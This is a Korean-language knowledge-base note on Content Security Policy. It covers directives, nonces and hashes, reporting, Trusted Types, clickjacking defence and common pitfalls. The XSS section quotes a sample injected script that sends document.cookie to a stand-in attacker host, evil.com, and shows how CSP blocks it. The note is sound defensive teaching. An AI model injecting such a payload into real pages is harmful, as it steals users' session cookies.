---
title: "CSP — Content Security Policy"
kind: knowledge
project: computer-science
agent: engineering-agent/tech-lead
status: current
created_at: 2026-05-14T00:10:00+09:00
tags:
  - network
  - http
  - security
  - csp
  - xss
---

# CSP — Content Security Policy

| 문서 버전 | 작성일 | 작성자 | 주요 변경 사항 |
| --- | --- | --- | --- |
| v.1.0.0 | 2026-05-13 | engineering-agent/tech-lead | Directives / Nonce / Hash / Report |

**[[security|↑ Security]]** · **[[../http|↑↑ HTTP]]**

---

## 1. 한 줄 정의

응답 헤더로 **브라우저가 어떤 자원을 어디서 로드 가능** 한지 정책. XSS / Clickjacking
방어의 핵심. W3C 표준.

---

## 2. 헤더

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc'; style-src 'self' 'unsafe-inline'
```

### 또는 (모니터만)

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

→ 위반 시 차단 X, report 만 (테스트).

---

## 3. Directives

### Fetch directives — 자원 종류별

| Directive | 제어 |
| --- | --- |
| **default-src** | fallback (다른 directive 누락 시) |
| **script-src** | JS |
| **style-src** | CSS |
| **img-src** | 이미지 |
| **font-src** | 폰트 |
| **media-src** | audio / video |
| **frame-src** | iframe 포함 (사장 — frame-ancestors / child-src) |
| **child-src** | iframe / worker |
| **connect-src** | fetch / XHR / WebSocket |
| **object-src** | `<object>`, `<embed>`, `<applet>` |
| **manifest-src** | manifest.json |
| **worker-src** | Worker / ServiceWorker |
| **prefetch-src** | preload / prefetch |

### Navigation directives

| Directive | 제어 |
| --- | --- |
| **form-action** | `<form action>` 의 URL |
| **frame-ancestors** | 누가 자기를 iframe 으로 임베드 가능 (X-Frame-Options 대체) |
| **navigate-to** | 사용자 navigation 의 URL |

### Document directives

| Directive | 제어 |
| --- | --- |
| **base-uri** | `<base>` 의 URL |
| **plugin-types** | MIME types of plugins |
| **sandbox** | iframe sandbox 같은 효과 |

### Reporting

| Directive | 제어 |
| --- | --- |
| **report-uri** | 위반 시 POST 할 URL (deprecated → report-to) |
| **report-to** | Reporting API endpoint |

---

## 4. Source 값

```
'self'                 ← 같은 origin
'none'                 ← 모두 차단
'unsafe-inline'        ← 인라인 스크립트/CSS (X 권장)
'unsafe-eval'          ← eval() (X 권장)
'unsafe-hashes'        ← inline event handlers 의 hash
'strict-dynamic'       ← nonce/hash 의 스크립트가 로드한 것 신뢰
https://cdn.example.com
*.example.com
https:                 ← 모든 HTTPS
data:                  ← data URL
blob:                  ← Blob URL
'nonce-abc123'         ← <script nonce="abc123">
'sha256-XXX...'        ← script 내용 hash
```

---

## 5. CSP 예제

### Strict (가장 안전)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'nonce-abc123';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  upgrade-insecure-requests
```

### Nonce 사용

```html
<script nonce="abc123">
  // 인라인 스크립트 OK (nonce 일치)
</script>

<script nonce="abc123" src="/app.js"></script>
```

→ 매 응답 다른 nonce — 공격자가 nonce 모름 → 인라인 XSS 차단.

### Hash 사용

```http
Content-Security-Policy: script-src 'self' 'sha256-XXX...'
```

```html
<script>
  // 이 스크립트의 sha256 hash 가 헤더의 hash 일치해야 실행
</script>
```

---

## 6. XSS 방어 메커니즘

### 공격
```html
<!-- 공격자가 페이지에 주입 -->
<script>fetch('https://evil.com?c=' + document.cookie)</script>
```

### CSP 방어
```http
Content-Security-Policy: script-src 'self' 'nonce-abc'
```

- 인라인 `<script>` 차단 (`'unsafe-inline'` 없음)
- evil.com 차단 (`'self'` 만)

→ 공격자 코드 실행 X.

---

## 7. Clickjacking 방어

### X-Frame-Options (옛)
```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

### CSP frame-ancestors (모던)
```http
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://partner.com
```

→ 더 표현력 ↑. 둘 다 보내도 OK.

자세히 → [[x-frame-options]]

---

## 8. Mixed Content

```http
Content-Security-Policy: upgrade-insecure-requests
```

- HTTP 자원 → HTTPS 자동 변환
- HTTPS 페이지의 옛 HTTP 링크 보호

```http
Content-Security-Policy: block-all-mixed-content
```

- 변환 X 차단

---

## 9. Reporting

```http
Content-Security-Policy:
  default-src 'self';
  report-uri /csp-report;
  report-to csp-endpoint

Reporting-Endpoints: csp-endpoint="/csp-report-v2"
```

### Report 형식
```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/exploit.js",
    "source-file": "https://example.com/page",
    "line-number": 42
  }
}
```

→ 보안 모니터링 — 잠재 공격 감지.

### Report-Only 모드

```http
Content-Security-Policy-Report-Only: ...
```

- 위반 시 **차단 X** — report 만
- 새 정책 도입 전 검증
- Production 에서 안전 도입

---

## 10. Trusted Types (모던, RFC 진행)

```http
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types default
```

```javascript
// 위반
element.innerHTML = userInput;  // 차단

// 통과
const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput);
```

→ DOM XSS 의 source 자체 방어.

---

## 11. nonce / hash 생성

### Nonce (매 응답 다른 값)

```python
import secrets
nonce = secrets.token_urlsafe(16)

response.headers["Content-Security-Policy"] = (
    f"default-src 'self'; script-src 'self' 'nonce-{nonce}'"
)
# HTML 에 같은 nonce 삽입
```

### Hash (정적)

```bash
# script 내용의 sha256
echo -n "console.log('hello')" | shasum -a 256 | xxd -r -p | base64
```

```http
Content-Security-Policy: script-src 'sha256-...'
```

---

## 12. strict-dynamic

```http
Content-Security-Policy:
  script-src 'nonce-abc' 'strict-dynamic'
```

→ nonce 의 스크립트가 동적으로 load 한 스크립트도 신뢰.

### 효과
- 모던 framework (React, Vue) 와 호환
- 화이트리스트 (URL 명시) 회피

---

## 13. 함정

### 함정 1 — unsafe-inline 의 약함
사실상 보호 X — XSS 가 인라인 주입 → 실행. nonce / hash 권장.

### 함정 2 — unsafe-eval
`eval()`, `Function()` 사용 시. 위험 — 코드 변경.

### 함정 3 — Wildcard 사용
`script-src *` — 모든 URL 허용 → 보호 X.

### 함정 4 — CSP 디버깅
Chrome DevTools 콘솔 — 위반 보고. Report-Only 로 테스트.

### 함정 5 — frame-ancestors 와 X-Frame-Options
모던: frame-ancestors. X-Frame-Options 는 ALLOW-FROM 지원 X.

### 함정 6 — 기본 정책 약함
`Content-Security-Policy: default-src 'self'` — 시작 좋지만 unsafe-inline 없어 인라인 코드 깨짐.

### 함정 7 — Inline event handlers
```html
<button onclick="...">     ← CSP 차단 (unsafe-inline 없으면)
```
→ `addEventListener` 사용.

### 함정 8 — Style 의 unsafe-inline
HTML inline style — 흔함. `style-src 'unsafe-inline'` 자주.

---

## 14. CSP 도입 단계

### 1. Report-Only 로 모니터
```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

### 2. 위반 분석 → 정책 조정

### 3. Enforce
```http
Content-Security-Policy: default-src 'self'; ...
```

### 4. 점진 강화

---

## 15. 학습 자료

- **CSP Level 3** (W3C)
- "Content Security Policy" — MDN
- "Strict CSP" — web.dev
- CSP Evaluator — https://csp-evaluator.withgoogle.com/

---

## 16. 관련

- [[security]] — Security hub
- [[x-frame-options]] — frame-ancestors 대안
- [[../cookies/cookie-security]] — XSS + HttpOnly
